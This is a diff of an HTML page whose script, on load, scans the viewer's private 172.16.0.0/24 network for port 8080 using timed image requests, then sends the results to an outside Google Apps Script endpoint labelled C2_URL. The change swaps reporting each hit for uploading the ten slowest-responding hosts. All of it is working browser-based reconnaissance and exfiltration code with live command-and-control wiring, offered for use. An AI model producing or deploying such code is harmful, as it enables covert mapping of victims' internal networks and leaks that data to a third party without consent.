@@ -1,95 +1,129 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Sequential Scanner</title>
+    <title>Network Timing Analyst</title>
     <style>
-        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; font-size: 14px; }
-        .highlight { color: #fff; font-weight: bold; background: #004400; padding: 2px 5px; }
-        .current { color: #ff0; }
-        #results { margin-top: 20px; border-top: 1px solid #333; padding-top: 10px; }
+        body { background-color: #1e1e1e; color: #d4d4d4; font-family: 'Consolas', monospace; padding: 20px; font-size: 13px; }
+        .row { border-bottom: 1px solid #333; padding: 2px 0; display: flex; }
+        .ip { width: 120px; color: #9cdcfe; }
+        .time { width: 80px; text-align: right; margin-right: 20px;}
+        .fast { color: #808080; } /* Grey for instant fails (Noise) */
+        .slow { color: #ce9178; font-weight: bold; } /* Orange/Red for connections (Targets) */
+        .timeout { color: #6a9955; } /* Green for timeouts */
+        #header { font-weight: bold; border-bottom: 2px solid #fff; margin-bottom: 10px; padding-bottom:5px;}
+        h2 { color: #fff; margin-top: 0; }
     </style>
 </head>
 <body>
-    <h1>// SEQUENTIAL ASSET HUNTER //</h1>
-    <div>TARGET PORT: 8080 (Chrome Controller)</div>
-    <div id="status" class="current">Initializing Queue...</div>
+    <h2>// TIMING ANALYST MODE //</h2>
+    <div id="status">Status: Initializing...</div>
     
-    <div id="results"></div>
+    <div id="header" class="row">
+        <span class="ip">IP ADDRESS</span>
+        <span class="time">LATENCY</span>
+        <span>INTERPRETATION</span>
+    </div>
+    <div id="log"></div>
 
     <script>
         // --- CONFIG ---
-        var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec";
+        var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec"; 
         var TARGET_PORT = 8080;
-        var SUBNET = '172.16.0.';
+        var BASE_IP = '172.16.0.';
         
-        // We will scan these IPs. 
-        // We prioritize .181 (your known IP) to prove it works immediately.
-        // Then we scan the rest.
+        // We put your known IP first to establish a baseline
         var queue = [181]; 
         for(var i=1; i<255; i++) {
             if(i !== 181) queue.push(i);
         }
 
-        // --- EXFILTRATION ---
-        function reportHit(ip) {
-            var msg = "!!! TARGET CONFIRMED: " + ip + " !!!";
-            document.getElementById('results').innerHTML += "<div class='highlight'>" + msg + "</div>";
+        var results = [];
+
+        function logResult(ip, time, type) {
+            var css = "fast";
+            var note = "RST / Refused (Noise)";
             
+            // HEURISTIC: Real connections take time. 
+            // Adjust this threshold based on what you see in the output!
+            if (time > 15 && time < 1000) { 
+                css = "slow";
+                note = "POTENTIAL TARGET (Open Port)";
+            } else if (time >= 1000) {
+                css = "timeout";
+                note = "Timeout (Host Down)";
+            }
+
+            var div = document.createElement('div');
+            div.className = "row " + css;
+            div.innerHTML = "<span class='ip'>" + ip + "</span><span class='time'>" + time + " ms</span><span>" + note + "</span>";
+            document.getElementById('log').appendChild(div);
+
+            // Scroll to bottom
+            window.scrollTo(0, document.body.scrollHeight);
+
+            // Add to exfil queue
+            results.push({ip: ip, time: time, note: note});
+        }
+
+        function finish() {
+            document.getElementById('status').innerText = "SCAN COMPLETE. UPLOADING DATA...";
+            
+            // Sort results to find the outliers (Slowest first)
+            results.sort((a, b) => b.time - a.time);
+
             fetch(C2_URL, {
                 method: "POST",
                 mode: "no-cors",
                 headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({
                     timestamp: new Date().toISOString(),
-                    type: "HIT",
-                    ip: ip,
-                    port: TARGET_PORT
+                    top_candidates: results.slice(0, 10), // Send top 10 slowest
+                    full_log_count: results.length
                 })
             });
         }
 
-        // --- SCANNER LOGIC ---
         function processQueue() {
-            if(queue.length === 0) {
-                document.getElementById('status').innerText = "SCAN COMPLETE.";
-                return;
-            }
+            if(queue.length === 0) { finish(); return; }
 
-            var currentOctet = queue.shift();
-            var ip = SUBNET + currentOctet;
-            
-            document.getElementById('status').innerText = "Scanning: " + ip + "...";
-
+            var octet = queue.shift();
+            var ip = BASE_IP + octet;
+            var start = performance.now();
             var img = new Image();
-            var timer = null;
+            var hasFinished = false;
 
-            // MOVE TO NEXT IP FUNCTION
-            var next = function() {
-                if(timer) clearTimeout(timer);
-                processQueue(); // Recursive call to process next item
+            var done = function() {
+                if(hasFinished) return;
+                hasFinished = true;
+                
+                var end = performance.now();
+                var duration = Math.round(end - start);
+                
+                logResult(ip, duration);
+                
+                // Small delay to let browser breathe
+                setTimeout(processQueue, 50); 
             };
 
-            // SUCCESS HANDLER (Load or Error = Port Open)
-            var onSuccess = function() {
-                reportHit(ip);
-                next();
-            };
+            img.onload = done;
+            img.onerror = done; // Both trigger 'done'
 
-            img.onload = onSuccess;
-            img.onerror = onSuccess; // "Chrome controller" text will trigger this
+            // 1 Second Timeout - If it takes longer, it's definitely not "Refused"
+            setTimeout(function() {
+                if(!hasFinished) {
+                    hasFinished = true;
+                    // We log 1000+ to indicate timeout
+                    logResult(ip, 1001); 
+                    img.src = "";
+                    setTimeout(processQueue, 50);
+                }
+            }, 1000);
 
-            // TIMEOUT HANDLER (Port Closed / Host Down)
-            timer = setTimeout(function() {
-                img.src = ""; // Kill pending request
-                // We don't report failures, just move on
-                next();
-            }, 2000); // 2 Seconds per IP is safe for sequential
-
-            // FIRE
             img.src = "http://" + ip + ":" + TARGET_PORT + "/favicon.ico?r=" + Math.random();
         }
 
         // START
+        document.getElementById('status').innerText = "Scanning 172.16.0.0/24...";
         processQueue();
 
     </script>
